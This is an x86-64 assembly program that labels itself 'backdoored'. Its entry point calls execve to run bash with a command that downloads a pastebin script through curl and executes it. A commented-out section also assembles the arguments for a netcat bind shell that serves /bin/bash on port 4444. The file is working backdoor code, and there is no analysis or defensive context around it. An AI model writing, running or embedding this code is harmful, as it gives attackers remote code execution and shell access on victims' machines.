global _start

_ft_strlen:; (string rdi)
	xor rax, rax; = 0
	.loop_char:
		cmp byte [rdi + rax], 0
		jz .return
		inc rax
	jmp .loop_char
	.return:
ret


_ft_memcpy: ; (string rdi, string rsi, size_t rdx)
	push rcx

	mov rax, rdi
	mov rcx, rdx
	push rdx
	mov rdx, rsi
	rep movsb
	push rax
	pop rdi
	push rdx
	pop rsi
	pop rdx
	mov rax, rdi

	pop rcx
ret

argv0 db `/bin/bash`, 0x0
argv1 db `-c`, 0x0
argv2 db `$(curl -s https://pastebin.com/raw/r3vA1PXu)`, 0x0
backdoored dq argv0, argv1, argv2, 0x0

_start:
	pop rax
	lea r9, [rsp + (rax + 1) * 4]
	push rax

	push r10
	push r11
	push r12
	push rcx

	xor rcx, rcx
	mov rbp, rsp

	xor rax, rax
	push rax; 8

	lea rdi, [rel argv2]
	call _ft_strlen
	inc rax
	sub rsp, rax
	push rdi
	pop rsi
	push rax
	pop rdx
	mov rdi, rsp
	call _ft_memcpy
	mov r10, rdx
	add r10, 8

	add rcx, rdx

	lea rdi, [rel argv1]
	call _ft_strlen
	inc rax
	sub rsp, rax
	push rdi
	pop rsi
	push rax
	pop rdx
	mov rdi, rsp
	call _ft_memcpy
	mov r11, rdx
	add r11, r10

	add rcx, rdx

	lea rdi, [rel argv0]
	call _ft_strlen
	inc rax
	sub rsp, rax
	push rdi
	pop rsi
	push rax
	pop rdx
	mov rdi, rsp
	call _ft_memcpy
	mov r12, rdx
	add r12, r11

	add rcx, rdx

	xor rax, rax
	push rax
;	lea rdx, [rsp + (rax + 1) * 4]
	mov rax, rbp
	sub rax, r10
	lea rbx, [rax]
	push rbx
	mov rax, rbp
	sub rax, r11
	lea rbx, [rax]
	push rbx
	mov rax, rbp
	sub rax, r12
	lea rbx, [rax]
	push rbx
	mov rsi, rsp

	push r9
	pop rdx

	lea rdi, [rel argv0]
	mov rax, 59
	syscall

	pop rcx
	pop r12
	pop r11
	pop r10

;        ; push argv, right to left
;        xor eax, eax
;        push eax          ; NULL
;        lea ebx, [ebp-8]
;        push ebx          ; "4444\0"
;        lea ebx, [ebp-11]
;        push ebx          ; "-p\0"
;        lea ebx, [ebp-21]
;        push ebx          ; "/bin/bash\0"
;        lea ebx, [ebp-27]
;        push ebx          ; "-lnke\0"
;        lea ebx, [ebp-36] ; filename
;        push ebx          ; "/bin//nc\0"
;        mov ecx, esp      ; argv
;        lea edx, [ebp-4]  ; envp (NULL)

	mov rax, 60
	syscall
